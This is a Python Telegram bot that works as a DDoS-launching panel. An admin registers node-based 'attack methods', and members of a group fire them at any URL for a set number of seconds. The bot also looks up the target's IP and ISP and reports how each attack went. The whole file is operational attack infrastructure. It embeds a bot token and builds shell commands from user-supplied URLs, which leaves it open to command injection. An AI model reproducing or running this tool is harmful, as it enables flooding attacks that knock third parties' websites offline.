import time, json, asyncio, socket, requests
from urllib import parse
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from html import escape

TOKEN = '7831523452:AAH_eaJxOeUBstLQbnwhY6bMKqr7xz9IvdU'
ADMIN_ID, GROUP_ID = 7371969470, -1002447120255
user_processes = {}

def load_methods(): 
    try: return json.load(open('methods.json', 'r'))
    except: return {}

def save_methods(data): 
    with open('methods.json', 'w') as f: json.dump(data, f, indent=4)

def get_ip_and_isp(url): 
    try: 
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
        return ip, response.json() if response.ok else None
    except: return None, None

async def command_handler(update, context, handler_func, min_args, help_text):
    if len(context.args) < min_args: return await update.message.reply_text(help_text)
    return await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("You do not have permission to use this command.")
    if len(context.args) < 2:
        return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/add <method_name> <url> timeset <time> <additional_args>")
    method_name, url = context.args[0], context.args[1]
    attack_time = 60  # Default time if no timeset
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except: return await update.message.reply_text("Invalid time parameter.")
        context.args = context.args[:context.args.index('timeset')] + context.args[context.args.index('timeset') + 2:]
    command = f"node --max-old-space-size=102400 {method_name} {url} {attack_time} " + " ".join(context.args[2:])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time}
    save_methods(methods_data)
    await update.message.reply_text(f"Method {method_name} has been added.")

async def attack_method(update, context, methods_data):
    if update.message.chat.id != GROUP_ID:
        return await update.message.reply_text(" Phá gì đó? ")
    if update.message.from_user.id in user_processes and user_processes[update.message.from_user.id].returncode is None:
        return await update.message.reply_text("You already have an ongoing attack. Please wait for it to finish before starting another.")
    if len(context.args) < 2: return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/attack <method_name> <url>")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data:
        return await update.message.reply_text("Method does not exist.")
    attack_time = methods_data[method_name].get('time', None)
    if update.message.from_user.id == ADMIN_ID and len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except ValueError: return await update.message.reply_text("Invalid time parameter. Please enter a valid number.")
    if update.message.from_user.id != ADMIN_ID and len(context.args) > 2:
        return await update.message.reply_text("You are not admin. You cannot specify the time for the attack.")
    if not attack_time:
        return await update.message.reply_text(f"Attack time for method {method_name} is not set in methods.json.")
    ip, isp_info = get_ip_and_isp(url)
    if not ip: return await update.message.reply_text("Could not retrieve IP from URL.")
    command = methods_data[method_name]['command'].replace(methods_data[method_name]['url'], url).replace(str(methods_data[method_name]['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'No ISP information available.'
    username = update.message.from_user.username or update.message.from_user.full_name
    start_time = time.time()  # Start time of the attack
    check_status_button = InlineKeyboardButton("🔍 Check website status", url=f"https://check-host.net/check-http?host={url}")
    keyboard = InlineKeyboardMarkup([[check_status_button]])
    await update.message.reply_text(
        f"Attack {method_name} started by @{username}.\nISP information of host {escape(url)}:\n<pre>{escape(isp_info_text)}</pre>\n"
        f"Attack will run for {attack_time} seconds.\n"
        f"Attack started at: {datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='HTML', reply_markup=keyboard
    )
    asyncio.create_task(execute_attack(command, update, method_name, keyboard, url, start_time, attack_time))

async def execute_attack(command, update, method_name, keyboard, url, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        end_time = time.time()
        attack_status = "success" if not stderr else "failed"
        error_message = stderr.decode() if stderr else None
    except Exception as e:
        end_time = time.time()
        attack_status = "failed"
        error_message = str(e)
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {
        "method_name": method_name,
        "username": update.message.from_user.username or update.message.from_user.full_name,
        "start_time": datetime.fromtimestamp(start_time).strftime('%Y-%m-%d %H:%M:%S'),
        "end_time": datetime.fromtimestamp(end_time).strftime('%Y-%m-%d %H:%M:%S'),
        "elapsed_time": elapsed_time,
        "attack_status": attack_status,
        "error": error_message or "None"
    }
    attack_info_text = json.dumps(attack_info, indent=2, ensure_ascii=False)
    safe_attack_info_text = escape(attack_info_text)
    await update.message.reply_text(
        f"Attack completed! Total time: {elapsed_time} seconds.\n\nDetails:\n<pre>{safe_attack_info_text}</pre>",
        parse_mode='HTML', reply_markup=keyboard
    )
    del user_processes[update.message.from_user.id]

async def list_methods(update, methods_data):
    if not methods_data: return await update.message.reply_text("No methods available.")
    methods_list = "Available methods:\n" + "\n".join([f"{name}: {data['time']} seconds" for name, data in methods_data.items()])
    await update.message.reply_text(methods_list)

async def delete_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID:
        return await update.message.reply_text("You do not have permission to use this command.")
    if len(context.args) < 1:
        return await update.message.reply_text("Invalid syntax. Use the command as follows: \n/del <method_name>")
    method_name = context.args[0]
    if method_name in methods_data:
        del methods_data[method_name]
        save_methods(methods_data)
        await update.message.reply_text(f"Method {method_name} has been deleted.")
    else:
        await update.message.reply_text(f"Method {method_name} does not exist.")

async def help_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
    **/add <method_name> <url> timeset <time>**: Add a new attack method (Admin only).
    **/attack <method_name> <url> [time]**: Launch an attack using the added method (Admin only).
    **/methods**: View available methods.
    **/del <method_name>**: Delete a method (Admin only).
    """
    await update.message.reply_text(help_text)

def main():
    methods_data = load_methods()
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("add", lambda update, context: command_handler(update, context, lambda u, c: add_method(u, c, methods_data), 2, "Invalid syntax. Use the command as follows: \n/add <method_name> <url> timeset <time> <additional_args>")))
    application.add_handler(CommandHandler("attack", lambda update, context: command_handler(update, context, lambda u, c: attack_method(u, c, methods_data), 2, "Invalid syntax. Use the command as follows: \n/attack <method_name> <url> [time]")))
    application.add_handler(CommandHandler("methods", lambda update, context: list_methods(update, methods_data)))
    application.add_handler(CommandHandler("del", lambda update, context: delete_method(update, context, methods_data)))
    application.add_handler(CommandHandler("help", help_message))
    application.run_polling()

if __name__ == "__main__": main()
